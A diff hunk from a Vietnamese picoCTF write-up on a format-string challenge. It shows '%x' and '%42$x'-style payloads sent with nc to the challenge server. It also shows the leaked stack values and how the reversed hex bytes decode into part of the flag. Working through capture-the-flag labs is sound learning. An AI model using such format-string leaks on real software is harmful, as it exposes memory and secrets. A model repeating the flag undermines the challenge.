@@ -77,7 +77,7 @@ Tell me a story and then I'll tell you one >> %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%
 Here's a story -
 ffead6c0.ffead6e0.8049346.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.252e78.6f636970.7b465443.6b34334c.5f676e31.67346c46.6666305f.3474535f.
 ```
-* Decode dãy này thì thu được flag gần hoàn chỉnh `ocip{FTCk43L_gn1g4lFff0_4tS_` (in ở dạng hex nên sẽ bị đảo 4 byte một, săp xếp lại ta được `picoCTF{L34k1ng_Fl4g_0ff_St4`). Vấn đề ở đây là dùng story nên nó chỉ chứa được 127 kí tự, mà trong stack vẫn còn nên ta tiếp tục leak những giá trị sau
+* Decode dãy này thì thu được flag gần hoàn chỉnh `ocip{FTCk43L_gn1g4lFff0_4tS_` (in ở dạng hex nên sẽ bị đảo 4 byte một, săp xếp lại ta được `picoCTF{L34k1ng_Fl4g_0ff_St4`). Vấn đề ở đây là dùng story và bị giới hạn độ dài chuỗi in ra nên sẽ không thể in ra hết các giá trị trong stack, nên ta tiếp tục leak những giá trị ở sau
 ```
 └─$ nc saturn.picoctf.net 64078 
 Tell me a story and then I'll tell you one >> %42$x.%43$x.%44$x.%45$x.%46$x.%47$x
